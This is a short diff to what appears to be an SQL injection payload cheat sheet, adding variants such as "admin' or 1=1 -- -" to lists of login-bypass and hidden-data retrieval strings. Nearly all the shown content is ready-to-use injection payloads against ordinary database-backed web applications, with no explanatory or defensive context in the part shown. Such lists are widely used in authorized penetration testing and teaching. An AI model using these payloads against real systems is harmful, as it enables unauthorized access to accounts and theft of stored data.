@@ -16,6 +16,7 @@ graph TD;
 
 ## Retriving hidden data
 ```sql
+' or 1=1 -- -
 ' or 1=1-- -
 ' or 1=1--
 ' --
@@ -81,7 +82,9 @@ admin') or 2 LIKE 2--
 admin') or ('2' LIKE '2
 admin') or ('2' LIKE '2'#
 admin') or ('2' LIKE '2'/*
+admin') or 1=1 -- -
 admin' or '1'='1
+admin' or 1=1 -- -
 admin' or '1'='1'--
 admin' or '1'='1'#
 admin' or '1'='1'/*
